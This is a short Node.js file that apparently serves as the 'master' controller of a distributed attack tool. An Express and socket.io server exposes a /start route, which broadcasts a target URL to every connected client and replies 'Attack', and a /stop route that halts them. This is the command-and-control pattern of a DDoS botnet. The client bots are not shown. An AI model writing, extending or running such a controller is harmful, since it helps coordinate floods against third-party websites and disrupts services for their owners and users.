const http = require('http');
const express = require('express');
//const io = require('socket.io')(server);
var app = express();
var server = http.createServer(app);
var socketIO=require('socket.io')
const io = socketIO(server);
io.on('connection', client => {
  client.on('event', data => { /* … */ });
  client.on('disconnect', () => { console.log("client ") });
  console.log("Client: "+client.id+" connected");
});
var url = "http://google.com";



app.get('/start',function(req,res){
   
io.emit('start',req.query.url)  
res.send("Attack")
})
app.get('/stop',function(req,res){
    io.emit('stop',"")
    res.send("STOP")
})
app.get('/test',function(req,res){
res.send("OK");
})

server.listen(3000);
console.log("master started")